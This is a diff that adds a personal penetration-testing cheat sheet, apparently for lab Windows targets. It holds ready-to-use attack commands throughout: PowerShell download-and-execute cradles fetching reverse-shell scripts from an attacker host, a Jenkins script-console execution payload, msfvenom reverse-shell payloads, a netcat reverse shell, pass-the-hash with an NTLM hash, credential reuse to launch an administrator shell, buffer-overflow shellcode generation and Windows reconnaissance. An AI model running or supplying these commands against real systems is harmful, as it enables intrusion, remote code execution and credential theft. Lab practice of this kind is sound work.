@@ -1,0 +1,72 @@
+##Powershell download HTTP##
+powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.x:xxx/powershell_attack.ps1')"
+
+##Transfer files##
+Python -m SimpleHTTPServer
+Python3 -m http.server
+Python -m pyftpdlib -p 21 -w
+Python3 -m pyftpdlib -p 21 -w
+
+##MSVENON PAYLOAD##
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe > arctic.exe
+
+##WFUZZ##
+wfuzz -c -w ../../../tools/SecLists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://xx.xx.xx.xx:xxx/FUZZ.FUZ2Z --hc 404,403 -t 100
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t xx.xx.xx.xx
+
+##VULN Jenkins script##
+consola jenkins
+cmd = """ powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.xx:8000/Invoke-PowerShellTcp.ps1')" """
+println cmd.execute().text
+
+##Shared attacker - victim##
+attacker: sudo impacket-smbserver share `pwd`
+victim: net use z: \\xx.xx.xx.xx\share
+
+##Brute force John##
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt file.hash
+
+##Get CMD Administrator with Hash NTLM##
+pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //xx.xx.xx.xx cmd
+
+##show stream de directorios##
+dir/R
+
+##Read stream with powershell##
+powershell Get-Content -Path "file.txt" -Stream "root.txt"
+
+##Take Advance Auto Login windows to privesc##
+SecPass = ConvertTo-SecureString 'FoundPass' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)​
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.xx:xxx/Invoke2-PowerShellTcp_Adminreverseshell.ps1')" -Credential $cred
+
+##Tunneling##
+NETCAT --> nc.exe -e cmd.exe xx.xx.xx.xx xxx
+SSH --> plink.exe -l kali -pw kali 10.10.14.20 -R 8888:127.0.0.1:8888
+
+##TIPS##
+Invoke --> Reverse Shell powershell
+Sherlock --> Check all vulns with "Find-AllVulns"
+
+##BoF##
+Create string with a specific long(2700) --> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
+reverse shell for BoF without invalid characters --> msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=xxx -a x86 --platform windows -b "\0x00\x0A\x0D" -e x86/shikata_ga_nai -f c
+
+##Windows Recon##
+ systeminfo
+ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ hostname
+ echo %username%
+ net users
+ ipconfig /all
+ route print
+ arp -A
+ netstat -ano
+ netsh firewall show state
+ netsh firewall show config
+ schtasks /query /fo LIST /v
+ tasklist /SVC
+ net start
+ DRIVERQUERY
+ wmic /? <---- Usefull Comand line windows
+ wmic qfe get Caption,Description,HotFixID,InstalledOn
